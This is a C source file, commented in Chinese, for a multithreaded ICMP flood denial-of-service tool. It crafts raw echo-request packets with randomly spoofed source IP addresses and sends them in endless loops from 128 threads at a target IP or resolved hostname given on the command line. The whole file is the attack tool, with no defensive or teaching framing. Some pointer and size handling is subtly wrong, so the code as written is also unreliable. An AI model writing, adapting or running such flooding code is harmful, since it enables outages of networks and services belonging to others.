//编译:
//		gcc -g3 -lpthread ./dos_icmp.c -o x



#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>



//最多线程数
#define MAXCHILD (128)
//ip 模式下, 默认port=80
#define IP_MODE_DEFAULT_PORT (80)
//dns 模式下, 默认proto="tcp", protoEX="http" (不能用大写!! 否则会失败!! 要看/etc/services 里面是怎样定义的)
//#define DNS_MODE_DEFAULT_PROTO "TCP"//* 大写错误 *
//#define DNS_MODE_DEFAULT_PROTOEX "HTTP"//* 大写错误 *
#define DNS_MODE_DEFAULT_PROTO "tcp"
#define DNS_MODE_DEFAULT_PROTOEX "http"



//
//多线程共享数据:
//
//攻击程序是否继续活动的标志
static int alive = -1;



//包含: ABCDE 地址, uint addr 是随机的
#define IP_ADDR_UINT_MAX (335544280)
//随机函数产生函数, 生产一个uint32 随机数, 用作伪造原地址, 随机数范围统一为[0,max]
/*
	A类地址, 地址范围0.0.0.0--127.255.255.255, 最大网络数126个, 最大主机数16777214, max=126*16777214; 推荐1-20*16777214=335544280(包含ABCDE 类IP 地址)
	B类地址, 地址范围128.0.0.0--191.255.255.255, 最大网络数为16256, 最大主机数65534, max=16256*65534; 推荐1-20*65534=1310680(包含ABC 类IP 地址)
	C类地址, 地址范围192.0.0.0--223.255.255.255, 最大网络数为2064512, 最大主机数254, max=2064512*254; 推荐1-200*254=50800(包含ABC 类IP 地址)
	D类地址, 范围从224.0.0.0--239.255.255.255, D类地址IP的最前面为"1110"网络号取值于224~239之间, 一般用在多路广播, 推荐1-20*16777214=335544280(包含ABCDE 类IP 地址)
	E类地址, E类IP地址的最前面为"1111"网络号取值于240~255之间是保留地址;
*/
static unsigned int rand_uint32(unsigned int max){
	unsigned int uiTmp;
	uiTmp = (unsigned int)( clock() % 2000 ) * ( clock() % 2000 ) * ( clock() % 1000 );
	return (unsigned int)rand_r(&uiTmp) % max;
}

#define IP_PORT_UINT_MAX (65534)
//随机函数产生函数, 生产一个uint16 随机数, 用作伪造原地址, 随机数范围统一为[0,max]
static unsigned short rand_uint16(unsigned short max){
	unsigned short uiTmp;
	uiTmp = (unsigned short)( clock() % 2000 ) * ( clock() % 2000 ) * ( clock() % 1000 );
	return (unsigned short)rand_r(&uiTmp) % max;
}

//根据tcp/ip 协议类型名, 得出对应的int 数字, 例如输入: getprotobynameEx("icmp")
static int getprotobynameEx(char* protoname){
	struct protoent* protocol = getprotobyname(protoname);
	if(protocol == NULL){
		perror("getprotobynameEx::getprotobyname()");
		return -1;
	}
	else
		return protocol->p_proto;
}

//根据serv_name 名, 得出对应的int 数字, 例如输入: getservbynameEx("http")
static int getservbynameEx(char* serv_name){
	struct servent* serv = getservbyname(serv_name, DNS_MODE_DEFAULT_PROTO);
	if(serv == NULL){
		perror("getservbynameEx::getservbyname()");
		return -1;
	}
	else
		return serv->s_port;
}

//addr_info (uint 模式下的ip+port)
struct addr_info{
	unsigned int ip32;
	unsigned short port16;
};
typedef struct addr_info addr_info_t;

//根据ip string+port, 填充addr_info_t(port = 0, 则随机填充端口)
int fill_addr_info_by_ip(addr_info_t* addr_info, char* ip, unsigned short port){
	addr_info->ip32 = inet_addr(ip);
	if(addr_info->ip32 == INADDR_NONE){
		perror("inet_addr()");
		return -1;
	}
	if(port == 0)
		addr_info->port16 = rand_uint16(IP_PORT_UINT_MAX);//设置随机端口
	else
		addr_info->port16 = port;
	return 0;
}


#define DNS_HOST_MAX (8)//一个DNS 最多解析出8个host ip
struct addr_infoEx{
	struct in_addr addr[DNS_HOST_MAX];//等价于一个uint32
	unsigned short addr_count;
	unsigned short port16;
};
typedef struct addr_infoEx addr_infoEx_t;

//根据dns+serv_name string, 填充addr_info_t
/*
	例如输入: 
		fill_addr_info_by_dns("127.0.0.1","http")
		fill_addr_info_by_dns("localhost","http")
		fill_addr_info_by_dns("www.baidu.com","http")
*/

int fill_addr_info_by_dns(addr_infoEx_t* addr_infoEx, char* dns, char* serv_name){
	char** p;
	unsigned short tmp;
	struct hostent* h = gethostbyname(dns);
	struct servent* serv = getservbyname(serv_name, DNS_MODE_DEFAULT_PROTO);
	if(h == NULL){
		perror("fill_addr_info_by_dns::gethostbyname()");
		return -1;
	}
	if(serv == NULL){
		perror("fill_addr_info_by_dns::getservbyname()");
		return -1;
	}
	if(h->h_addrtype == AF_INET){					//是否是AF_INET 协议簇, 不是则放弃
		p = h->h_addr_list;									//指向URL主机ip 字符串链表
		addr_infoEx->addr_count = 0;				//初始化dns 解释出0 个ip 地址
		while(*p != NULL){
			addr_infoEx->addr_count++;				//dns 解释出n 个ip 地址, 都做记录
			p++;
		}
		if(addr_infoEx->addr_count >= DNS_HOST_MAX - 1)
			addr_infoEx->addr_count = DNS_HOST_MAX - 1;
		p = h->h_addr_list;									//指针复位
		//while(*p != NULL)
			//printf("	URL网关主机ip: %s;\n",inet_ntoa(*((struct in_addr*)*p++)));
		tmp = 0;
		while(*p != NULL){//拷贝struct in_addr 地址信息
			memcpy(&addr_infoEx->addr[tmp++], (struct in_addr*)p++, sizeof(struct in_addr));//struct in_addr in
			if(tmp >= DNS_HOST_MAX)
				break;//不允许溢出, 解析dns 超过8 个ip, 后续的抛弃
		}
	}
	else{
		printf("fill_addr_info_by_dns(%s) results is not AF_INET!! please check\n", dns);
		return -1;
	}
	addr_infoEx->port16 = serv->s_port;		//port 赋值
	return 0;
}



static void DoS_icmp(int rawsock, struct sockaddr_in* to){
	struct ip* iph;
	struct icmp* icmph;
	char *packet;
	int pktsize = sizeof(struct ip) + sizeof(struct icmp) + 64;
	unsigned int src_ip;

	//packet = malloc(pktsize);
	packet = alloca(pktsize);
	iph =(struct ip*)packet;
	icmph =(struct icmp*)(packet + sizeof(struct ip));

	memset(packet, 0, pktsize);

	//填充ip 地址协议
	iph->ip_v = 4;																//IP的版本,IPv4 
	iph->ip_hl = 5;																//IP头部长度,字节数 
	iph->ip_tos = 0;															//服务类型 
	iph->ip_len = htons(pktsize);									//IP报文的总长度 
	iph->ip_id = htons(getpid());									//标识,设置为PID 
	iph->ip_off = 0;															//段的便宜地址 
	iph->ip_ttl = 0x4f;														//TTL 
	iph->ip_p = getprotobynameEx("icmp");					//协议类型 
	iph->ip_sum = 0;															//校验和,先填写为0
	src_ip = rand_uint32(IP_ADDR_UINT_MAX);				//产生一个随机uint32 数, 冒充源ip 地址(ip地址char [32] 转换后也是uint32)
	memcpy(&iph->ip_src, &src_ip, sizeof(struct sockaddr_in));
	memcpy(&iph->ip_dst, &to->sin_addr.s_addr, sizeof(struct sockaddr_in));//发送目标地址

	//填充icmp 地址协议
	icmph->icmp_type = ICMP_ECHO;									//ICMP类型为回显请求 
	icmph->icmp_code = 0;													//代码为0 
	icmph->icmp_cksum = htons(~(ICMP_ECHO << 8));	//由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算 

	//发送数据
	//printf("sfd=%d, ip_src=%d, ip_dst=%d, port=%d, sendto()=%d\n", rawsock, src_ip, to->sin_addr.s_addr, to->sin_port, pktsize);//for test only
	pktsize = sendto(rawsock, packet, pktsize, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));
	if(pktsize < 0)
		perror("DoS_icmp::sendto()");
	else
		printf("sfd=%d, ip_src=%d, ip_dst=%d, port=%d, sendto()=%d\n", rawsock, src_ip, to->sin_addr.s_addr, to->sin_port, pktsize);

	//释放缓冲区内存(使用alloca() 就不需要了)
	//free(packet);
	return;
}



//输入ip, 则ip 不变, 端口不变, 只进行多线程批量攻击
static void DoS_ip(addr_info_t *addr_info){
	struct sockaddr_in to;
	unsigned int tmp = 0;
	int rawsock = -1;//原始套接字的sfd

	//建立原始socket
	rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if(rawsock == -1){
		perror("socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)");
		return -1;
	}
	//设置IP选项
	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", 1);

	//填写发送目的地址info
	to.sin_family = AF_INET;
	memcpy(&to.sin_addr.s_addr, &addr_info->ip32, sizeof(struct sockaddr_in));
	to.sin_port = htons(addr_info->port16);

	while(alive){
		DoS_icmp(rawsock, &to);
		printf("pid-%d: %d\n", pthread_self(), tmp++);
	}

	close(rawsock);
	return;
}

//输入dns, 则多个ip 更换攻击, 端口不变, 同时进行多线程批量攻击
static void DoS_dns(addr_infoEx_t *addr_infoEx){
	struct sockaddr_in to;
	unsigned int tmp = 0, count = 0;
	int rawsock = -1;//原始套接字的sfd

	//建立原始socket
	rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if(rawsock == -1){
		perror("socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)");
		return -1;
	}
	//设置IP选项
	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", 1);

	while(alive){
		count = 0;
		while(count < addr_infoEx->addr_count){
			//填写发送目的地址info
			to.sin_family = AF_INET;
			memcpy(&to.sin_addr.s_addr, &addr_infoEx->addr[count++], sizeof(struct sockaddr_in));
			to.sin_port = htons(addr_infoEx->port16);
			DoS_icmp(rawsock, &to);
		}
		printf("pid-%d: %d\n", pthread_self(), tmp++);
	}

	close(rawsock);
	return;
}


//执行DoS 死亡发射循环
static int DoS_fun(char *ip_dns){
	addr_info_t addr_info;
	addr_infoEx_t addr_infoEx;

	if(fill_addr_info_by_ip(&addr_info,ip_dns,IP_MODE_DEFAULT_PORT) == -1){
		if(fill_addr_info_by_dns(&addr_infoEx,ip_dns,DNS_MODE_DEFAULT_PROTOEX) == -1){
			printf("DoS_fun(%s) failed!!\n", ip_dns);
			return -1;
		}
		else{
			printf("DoS_dns()\n");//for test only
			DoS_dns(&addr_infoEx);
		}
			
	}
	else{
		printf("DoS_ip()\n");//for test only
		DoS_ip(&addr_info);
	}
	return 0;
}

//信号处理函数,设置退出变量alive, 用来退出DoS_fun()
static void DoS_sig(int signo){
	alive = 0;
}



int main(int argc, char *argv[]){
	int i = 0;
	pthread_t pth_pool[MAXCHILD];
	int err = -1;
	unsigned long dest = 0;//目标主机的ip 地址(uint32)



	//检查参数数量是否正确
	if(argc != 2)
		return -1;

	//设置截获信号CTRL+C
	signal(SIGINT, DoS_sig);

	//设置DoS_fun()启动标志
	alive = 1;

	//初始化线程池
	for(i=0; i<MAXCHILD; i++)
		pth_pool[i] = 0;
		//printf("%d\n", rand_uint32(IP_ADDR_UINT_MAX));

	//建立多个线程协同工作
	for(i=0; i<MAXCHILD; i++){
		err = pthread_create(&pth_pool[i], NULL, DoS_fun, argv[1]);
		if(err != 0){
			perror("pthread_create()");
			break;
		}
	}

	//等待线程结束
	for(i=0; i<MAXCHILD; i++){
		if(pth_pool[i] != 0){
			err = pthread_join(pth_pool[i], NULL);
			if(err != 0){
				perror("pthread_join()");
				break;
			}
		}
	}

	return 0;
}




